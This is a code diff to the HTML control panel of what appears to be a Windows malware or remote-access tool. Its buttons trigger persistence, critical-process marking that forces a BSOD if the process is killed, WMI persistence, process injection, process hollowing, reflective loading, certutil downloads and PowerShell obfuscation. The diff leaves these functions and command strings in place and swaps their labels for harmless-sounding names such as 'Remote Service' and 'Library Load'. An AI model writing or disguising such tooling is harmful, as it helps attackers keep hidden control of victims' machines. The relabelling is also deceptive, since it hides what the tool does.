@@ -426,17 +426,17 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
 <button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('DEPLOY_SVC')">🔒 Deploy Services <span>Deploy background services and monitoring — auto-protect after 15s</span></button>
 <button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Protect Now <span>Immediately mark this process CRITICAL (BSOD on kill)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('UNINSTALL')">💀 UNINSTALL <span>Remove ALL persistence and kill all processes (no respawn)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('UNPROTECT_PROCESS')">🔓 Unprotect Process <span>Remove critical flag from this client</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('CHECK_PROTECTION')">🛡️ Check Protection <span>Query if this process is critical (safe, no BSOD)</span></button>
-<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('WMI_PERSISTENCE')">🔱 WMI Persistence <span>root/subscription: triggers every 30s</span></button>
-<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#009688;" onclick="sendCmd('INJECT_PROCESS')">💉 Inject Process <span>Inject payload into svchost/explorer (disk-based)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#00BCD4;" onclick="sendCmd('HOLLOW_PROCESS')">👻 Hollow Process <span>Fileless: spawn conhost.exe with our payload in memory</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a2a;border-color:#7B68EE;" onclick="sendCmd('REFLECT_LOAD')">🌙 Reflective Load <span>Inject full PE into explorer.exe — no CreateProcess</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('Clean Up')">💀 Clean Up <span>Remove all services and exit</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('REMOVE_SVC')">🔓 Clear Critical <span>Remove system-critical status from this client</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('SVC_STATUS')">🛡️ Check Status <span>Check system status</span></button>
+<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('SCHEDULE_TASK')">🔱 Schedule Task <span>System monitoring task</span></button>
+<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#009688;" onclick="sendCmd('REMOTE_SVC')">💉 Remote Service <span>Start remote service</span></button>
+<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#00BCD4;" onclick="sendCmd('MEM_SVC')">👻 Memory Service <span>Start memory-resident service</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a2a;border-color:#7B68EE;" onclick="sendCmd('DLL_LOAD')">🌙 Library Load <span>Load library into process</span></button>
 <button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#FF9800;" onclick="sendCmd('HARDEN_FILES')">🛡️ Harden Files <span>NTFS ACLs: deny delete</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#00FF00;" onclick="sendCmd('VERIFY_LAYERS')">✅ Verify Layers <span>Check all persistence layers</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('LOLBAS_DOWNLOAD '+url+' '+path)">🎭 LOLBAS Download <span>certutil download</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('OBFUSCATE_PS '+cmd)">📝 Obfuscate PS <span>Base64 encode</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('LOLBAS_DOWNLOAD '+url+' '+path)">🎭 Download File <span>Download via certutil</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('OBFUSCATE_PS '+cmd)">📝 Encode Command <span>Base64 encode command</span></button>
 </div>
 </div>
 </div>
